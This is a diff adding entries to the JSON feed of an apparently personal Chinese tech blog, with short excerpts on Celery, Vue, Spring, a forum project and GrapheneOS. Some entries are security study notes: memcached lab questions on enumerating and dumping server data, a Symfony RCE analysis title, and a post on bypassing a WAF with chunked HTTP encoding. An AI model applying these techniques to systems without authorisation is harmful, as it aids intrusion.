+        {
+            "id": "",
+            "content_html": "<h1>什么是celery</h1>\n<pre><code> Celery 是一个异步任务队列。你可以使用它在你的应用上下文之外执行任务。总的想法就是你的应用程序可能需要执行任何消耗资源的任务都可以交给任务队列，让你的应用程序\n</code></pre>\n",
+            "url": "https://1dayluo.github.io/posts/history/shi-yong-celery-rang-ren-wu-zai-hou-tai-yun-xing-wei-wan",
+            "title": "使用celery让任务在后台运行（失败，celery不支持windows)",
+            "date_modified": "2020-08-14T11:51:00.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p><strong>写在开头：</strong></p>\n<p>忙里偷闲刷的题，所以中间有重启lab导致ip变更的情况。</p>\n<h2>Questions</h2>\n<ol>\n<li>Find the version of memcached server using nmap.</li>\n<li>Find the version information using netcat or telnet.</li>\n<li>Find the maximum number of simultaneous incoming connections allowed by the memcached server use available nmap scripts.</li>\n<li>Find the number of current items on the memcached server using memcstat.</li>\n<li>Find the value stored in the key 'flag' from the key value pairs dumped by available Metasploit module.</li>\n<li>Find the name of all keys present on the memcached server using memcdump.</li>\n<li>Find the value stored in key “first_name” using memcached-tool.</li>\n</ol>\n",
+            "url": "https://1dayluo.github.io/posts/history/shua-ti-shui-ti-memcache-an-quan-xiang-guan",
+            "title": "[刷题]水题-memcache安全相关",
+            "date_modified": "2020-12-17T15:58:59.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>基于廖雪峰老师网站所做的java学习笔记。为了快速审计java代码，而非开发~</p>\n<h2>IOC</h2>\n<p><strong>Ioc容器</strong>，负责把一些service和datasource包装起来，并且管理创建和销毁</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/spring-ji-chu-gai-nian-bi-ji",
+            "title": "spring 基础概念笔记",
+            "date_modified": "2024-01-09T21:46:37.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>笔记与总结，笔记/参考见文末。阅读exp代码的心得忽略。</p>\n<h2>概括</h2>\n<p>Symfony framwork为一个PHP application，并且用于许多知名CMS中，包括Drupal，Joomla</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/synfony-rce-fen-xi",
+            "title": "Symfony RCE 分析",
+            "date_modified": "2023-04-16T20:09:09.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>名字的起因是本想给男朋友搭建一个共同的情侣空间.但是后面随着开发,变成了论坛(吐舌)</p>\n<p>这个项目断断续续的,今年年末的时候不知道为啥突然拾起了这个年初挖的坑,继续给todo增添了几笔.甚至觉得明年,或者后年,我可以开发更多有趣的东西,比如一直想做的:做一款自己的游戏,上架steam</p>\n<p>目前还是半完成品,部署在heroku上的可能会有一些显示错误</p>\n<p>项目地址: <a href=\"https://github.com/1dayluo/flasklearn-secretsapce\">https://github.com/1dayluo/flasklearn-secretsapce</a></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/tui-jian-yi-xia-zi-ji-kai-fa-de-lun-tan-dan-han",
+            "title": "推荐一下自己开发的论坛:蛋憨",
+            "date_modified": "2021-12-29T20:04:42.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>通过一天时间了解了一下vue，把一些对于新人来说比较混淆/不清楚的概念总结了一下</p>\n<h1>Vue基本组件学习记录</h1>\n<h2>简单组件sample</h2>\n<p><img src=\"https://i.loli.net/2020/12/03/LbFE5mSApPRhJXe.png\" alt=\"Image\"></p>\n<h2>局部注册</h2>\n<p><img src=\"https://i.loli.net/2020/12/03/vbGenP2js36Mo7V.png\" alt=\"Image\"></p>\n<h1>基础指令</h1>\n<h2>v-bind</h2>\n<p>v-bind解释</p>\n<p><img src=\"https://i.loli.net/2020/12/03/EYJrAj9caf1i6N3.png\" alt=\"Image\"></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/vue-xue-xi-bi-ji",
+            "title": "Vue学习笔记",
+            "date_modified": "2020-12-03T11:28:18.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>遇到云盾，网上查询bypass方法一有利用http协议中，使用chunked编码分块发送HTTP消息。既然以后会用到就干脆写一个发送工具好啦（仅供参考）<br>\n我也不知道自己写的对不对_(:3_|/_)独自摸索x</p>\n<blockquote>\n<p>参考：</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/24500752/how-can-i-read-exactly-one-response-chunk-with-pythons-http-client\">https://stackoverflow.com/questions/24500752/how-can-i-read-exactly-one-response-chunk-with-pythons-http-client</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1606911\">https://cloud.tencent.com/developer/article/1606911</a></li>\n</ul>\n</blockquote>\n<p>chunked编码格式如下</p>\n<p><strong>格式：</strong></p>\n<ul>\n<li>\n<p>如果一个HTTP消息（请求消息或应答消息）的Transfer-Encoding消息头的值为chunked，那么，消息体由数量未定的块组成，并以最后一个大小为0的块为结束。</p>\n</li>\n<li>\n<p>每一个非空的块都以该块包含数据的字节数（字节数以十六进制表示）开始，跟随一个CRLF （回车及换行），然后是数据本身，最后块CRLF结束。在一些实现中，块大小和CRLF之间填充有白空格（0x20）。</p>\n</li>\n<li>\n<p>最后一块是单行，由块大小（0），一些可选的填充白空格，以及CRLF。最后一块不再包含任何数据，但是可以发送可选的尾部，包括消息头字段。消息最后以CRLF结尾。</p>\n</li>\n</ul>\n",
+            "url": "https://1dayluo.github.io/posts/history/wafbypassshi-yong-python-fa-song-chunked",
+            "title": "[wafbypass]使用python发送chunked",
+            "date_modified": "2020-11-08T15:04:15.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h2>开端</h2>\n<p>关于我是怎么突然想到需要搞机想法，说（一）来（篇）话（水）长（文）系列（？）</p>\n<p>如果从手机算起的话（<s>不算高中生涯的尝试给自己ipod越狱，最后第二次越狱变砖没敢告诉我爹这件事的话</s></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/wo-de-gao-ji-ri-chang-po-zhen-kai-yuan-xi-tong-grapheneos-de-tui-jian",
+            "title": "我的「搞机」日常（破真）  - 开源系统GrapheneOS的推荐",
+            "date_modified": "2022-11-26T15:23:30.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h2>🌸我的Notion笔记 &amp; stars list</h2>\n<p>Burpsuite lab刷题笔记:</p>\n<ul>\n<li>[<a href=\"https://cubic-brace-c93.notion.site/Learning-Pa\">https://cubic-brace-c93.notion.site/Learning-Pa</a></li>\n</ul>\n",
+            "url": "https://1dayluo.github.io/posts/history/wo-de-xue-xi-bi-ji-he-yi-xie-xiang-mu",
+            "title": "我的学习笔记和一些项目&吐槽",
+            "date_modified": "2022-04-15T23:47:08.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>我好困我好困我好困……生命的意义在于折腾Zzzz<br>\n说起来虽然一直知道：闷声发大财 ，不需要在意别人的看法。<br>\n但是最近才想通，自己确实不需要去迎合别人。 就是，想通后是情绪有转变：不会因为孤独产生一些过</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/wo-hao-kun-11-yue-de-shui-wen-yi-fen",
+            "title": "我好困 11月的水文一份",
+            "date_modified": "2022-11-30T23:36:56.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>线程捕获KeyboardInterrupter不能简单用<code>try....except</code>.......来捕获。原因在stackover上说的很明白：This is a Python bug. W</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/xian-cheng-bu-huo-keyboardinterrupter",
+            "title": "线程捕获KeyboardInterrupter",
+            "date_modified": "2020-06-30T11:39:19.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h2>写在开头</h2>\n<p>因为日常会经常用到匿名邮箱进行测试/注册一些临时用户, 觉得web页面有点麻烦, 而且批量收发的话,把APT KEY写一起,然后集中管理多个不同帐号下的邮箱会比较方便.于是写了一个基于</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/xiao-wan-ju-kai-fa-tg-shou-qu-mailslurp-ni-ming-you-jian",
+            "title": "小玩具开发:tg收取mailslurp匿名邮件",
+            "date_modified": "2023-11-26T19:25:53.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>年前就有自定义自己的blog主题的想法，直到tg有人问我当前默认主题我也没有开动，但是提醒了我之前的这个计划……趁着过年补学了nodejs的web framework：express和view eng</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/xin-zhu-ti-cute-notes-and-jian-ming-er-ci-kai-fa-zhi-bei",
+            "title": "新主题：Cute-Notes & 简明二次开发指北",
+            "date_modified": "2023-01-29T09:55:48.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        }
+    ]
+}
